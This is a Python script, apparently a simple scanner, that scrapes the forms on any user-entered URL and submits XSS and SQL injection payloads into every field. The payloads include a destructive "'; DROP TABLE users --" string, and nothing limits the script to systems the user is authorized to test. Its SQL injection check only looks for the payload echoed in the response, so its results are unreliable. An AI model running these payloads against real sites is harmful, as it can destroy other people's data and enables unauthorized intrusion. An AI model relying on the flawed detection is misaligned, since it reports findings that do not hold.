import requests
from bs4 import BeautifulSoup

# List of XSS and SQL payloads for testing
payloads = {
    "xss": ['<script>alert(1)</script>', '"><script>alert(1)</script>'],
    "sql_injection": ["' OR 1=1 --", "'; DROP TABLE users --"]
}

# Custom headers to mimic a browser
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Function to scan a URL for vulnerabilities
def scan_url(url):
    print(f"Scanning {url}...\n")

    try:
        # Send a GET request to the URL
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()

        # Parse the HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all forms on the page
        forms = soup.find_all("form")
        print(f"Found {len(forms)} form(s) on the page.\n")

        for i, form in enumerate(forms):
            print(f"Scanning form {i + 1}...")

            # Extract form action and method
            action = form.get("action")
            method = form.get("method", "get").lower()

            # Collect form fields
            inputs = form.find_all("input")
            form_data = {input.get("name", ""): input.get("value", "") for input in inputs if input.get("name")}

            for vul_type, payload_list in payloads.items():
                for payload in payload_list:
                    # Inject payload into form fields
                    test_data = {key: payload for key in form_data.keys()}
                    target_url = url if not action or action == "#" else action

                    # Send the payload
                    if method == "post":
                        test_response = requests.post(target_url, data=test_data, headers=headers)
                    else:
                        test_response = requests.get(target_url, params=test_data, headers=headers)

                    # Check if payload is reflected in the response
                    if payload in test_response.text:
                        print(f"[!] Vulnerability Detected ({vul_type.upper()}) with payload: {payload}")
                    else:
                        print(f"[-] No {vul_type} vulnerability with payload: {payload}")

            print("-" * 50)

    except requests.exceptions.RequestException as e:
        print(f"Error connecting to {url}: {e}")

# Main function to start scanning
if __name__ == "__main__":
    target_url = input("Enter the URL to scan (e.g., http://example.com): ")
    scan_url(target_url)
